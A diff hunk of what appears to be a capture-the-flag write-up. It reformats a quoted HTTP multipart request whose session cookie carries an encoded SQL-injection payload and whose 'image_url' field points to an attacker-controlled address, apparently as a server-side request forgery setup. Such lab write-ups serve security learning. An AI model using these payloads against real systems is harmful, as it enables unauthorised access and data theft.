@@ -170,30 +170,30 @@ Cookie: session=eyJ1c2VyIjoiJ09SIDE9MS0tIC0ifQ.YSLw7w.2OHVWSzrpZAobEiyfxo94ul3lf
 Upgrade-Insecure-Requests: 1  
 Sec-GPC: 1  
   
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="author"  
   
 0xd4y  
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="title"  
   
 Writeup  
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="tagline"  
   
 Writeup  
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="image"; filename=""  
 Content-Type: application/octet-stream  
   
   
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="image_url"  
   
 http://10.10.15.80/image.jpg  
-\-----------------------------12417370376638841362770592069  
+-----------------------------12417370376638841362770592069  
 Content-Disposition: form-data; name="content"Thanks for reading!  
-\-----------------------------12417370376638841362770592069--
+-----------------------------12417370376638841362770592069--
 {% endhighlight %}
 
 Note the “image_url” parameter highlighted in red  
